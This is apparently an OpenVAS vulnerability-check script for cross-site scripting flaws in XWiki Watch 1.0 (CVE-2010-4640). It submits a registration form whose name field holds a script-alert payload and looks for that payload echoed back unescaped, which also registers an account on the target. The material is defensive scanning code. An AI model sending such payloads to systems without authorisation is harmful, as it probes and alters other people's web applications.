##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xwiki_watch_mult_xss_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# XWiki Watch Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801564");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-01-08 10:30:18 +0100 (Sat, 08 Jan 2011)");
  script_cve_id("CVE-2010-4640");
  script_bugtraq_id(44606);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("XWiki Watch Multiple Cross Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42090");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/62941");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/62940");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - An  Input passed via the 'rev' parameter to 'xwiki/bin/viewrev/Main/WebHome'
  or 'xwiki/bin/view/Blog' is not properly sanitised before being returned to the user.

  - An Input passed via the 'register_first_name' and 'register_last_name'
  parameters to 'xwiki/bin/register/XWiki/Register' is not properly sanitised
  before being displayed to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running XWiki Watch and is prone to multiple cross
  site scripting vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site when malicious data is being viewed.");

  script_tag(name:"affected", value:"XWiki Watch version 1.0");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

xwport = get_http_port(default:8080);

sndReq = http_get(item:"/xwiki/bin/view/Main/WebHome", port:xwport);
rcvRes = http_send_recv(port:xwport, data:sndReq);

if("XWiki - Main - WebHome" >!< rcvRes &&
   "Welcome to your XWiki Watch" >!< rcvRes){
 exit(0);
}

filename = "/xwiki/bin/register/XWiki/Register";
useragent = http_get_user_agent();
host = http_host_name( port:xwport );

authVariables ="template=XWiki.XWikiUserTemplate&register=1&register_first_name" +
               "=dingdong&register_last_name=%3Cscript%3Ealert%281111%29%3C%2Fscr" +
               "ipt%3E&xwikiname="+rand()+"&register_password=dingdong&register2_passwor" +
               "d=dingdong&register_email=dingdong";

sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: en-us,en;q=0.5\r\n",
                 "Keep-Alive: 300\r\n",
                 "Connection: keep-alive\r\n",
                 "Referer: http://", host, filename, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                  authVariables);
rcvRes = http_keepalive_send_recv(port:xwport, data:sndReq);

if(rcvRes =~ "^HTTP/1\.[01] 200" && "<script>alert(1111)</script></" >< rcvRes && "Registration successful.">< rcvRes){
  report = report_vuln_url(port:xwport, url:filename);
  security_message(port:xwport, data:report);
}
